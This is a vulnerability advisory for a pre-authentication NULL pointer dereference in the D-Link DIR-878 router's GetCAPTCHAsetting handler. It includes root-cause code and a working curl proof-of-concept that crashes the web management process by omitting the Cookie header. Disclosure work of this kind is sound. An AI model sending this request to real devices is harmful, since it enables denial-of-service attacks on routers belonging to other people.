# D-Link DIR-878 GetCAPTCHAsetting Missing Cookie NULL Pointer Dereference (Pre-authentication DoS)

> **Status:** CVE: Not assigned (identifier requested). Vendor notification: pending. Repository published for coordinated disclosure.

## Summary

A NULL pointer dereference vulnerability was discovered in D-Link DIR-878 (REV A) firmware
v1.20B05. The `GetCAPTCHAsetting` HNAP handler in `bin/prog.cgi` executes
`strcpy(malloc(0xb), uid)` when registering a new uid. When the request carries **no Cookie
header at all**, the cookie parser leaves `uid = NULL`, and `strcpy` reads from address 0,
causing an immediate SIGSEGV. `GetCAPTCHAsetting` serves the login page and is reachable without
any authentication — a remote, unauthenticated attacker can repeatedly crash the web management
FastCGI worker with a single trivial request.

## Affected Product

- Vendor: D-Link
- Product: DIR-878, Hardware Revision A
- Firmware: v1.20B05 (verified). The product is EoL/EoS; later v1.30B08 hotfix builds share the
  same HNAP codebase lineage but were not individually re-verified.

## Vulnerability Details

- Type: NULL Pointer Dereference — CWE-476
- Component: `bin/prog.cgi`, `GetCAPTCHAsetting` handler at 0x436158; cookie parser at 0x424610

### Root Cause

```c
uid = parse_cookie_uid();   /* FUN_00424610: returns NULL when no Cookie header is present */
...
char *p = malloc(0xb);
strcpy(p, uid);             /* uid == NULL → read from address 0 → SIGSEGV */
```

There is no NULL check between parsing and the copy. This is an independent defect on the same
`strcpy` line as the heap overflow in advisory 01 (which is triggered by an *over-long* uid);
here the trigger is the *absence* of the Cookie header.

| | Advisory 01 (heap overflow) | This advisory (NULL deref) |
|---|---|---|
| Defect | missing length check | missing NULL check |
| Trigger | `Cookie: uid=<very long>` | no Cookie header (or empty Cookie) |
| CWE | CWE-787/122 | CWE-476 |
| Consequence | heap metadata corruption | immediate crash |

## Proof of Concept (non-destructive)

```bash
curl -s -o /dev/null -w "%{http_code}\n" -X POST http://<router>/HNAP1/ \
  -H "Content-Type: text/xml" \
  -H 'SOAPACTION: "http://purenetworks.com/HNAP1/GetCAPTCHAsetting"' \
  --data-binary '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><GetCAPTCHAsetting xmlns="http://purenetworks.com/HNAP1/"></GetCAPTCHAsetting></soap:Body></soap:Envelope>'
# Observed: 500 (prog.cgi crash; lighttpd log records FastCGI worker death + core dump)

# Control group — add any Cookie:
curl -s -o /dev/null -w "%{http_code}\n" -X POST http://<router>/HNAP1/ \
  -H "Content-Type: text/xml" \
  -H 'SOAPACTION: "http://purenetworks.com/HNAP1/GetCAPTCHAsetting"' \
  -H "Cookie: uid=ab12" \
  --data-binary '<same body>'
# Observed: 200 OK
```

The differential (no Cookie → 500/crash; with Cookie → 200) was dynamically reproduced, with a
163 MB core dump attributed to `prog.cgi`.

**Cleanup:** none required; the FastCGI worker is restarted automatically and nothing is written
to configuration or flash.

## Impact

- Attacker profile: unauthenticated, adjacent network (trivially exploitable — a single curl).
- Proven impact: pre-authentication crash of the web management handler; repeated requests keep
  the management interface suppressed (denial of service).

## CVSS 3.1

`CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H` — **6.5** (Medium)

Scored on the proven pre-authentication crash (DoS).

## Discovery

Discovered by Zimo-666 on 2026-10-12 via dynamic differential testing (Cookie present vs. absent)
with core attribution, root-caused by static reverse engineering.
Vendor notified: pending.

---

## Repository files

| File | Content |
|---|---|
| `README.md` | This advisory |
| `poc.sh` | Non-destructive reproduction script, derived from the request recorded above |

> The script reproduces the HTTP request documented in this advisory. It is not a substitute for
> the recorded test evidence; the observed outputs quoted above are the evidence.
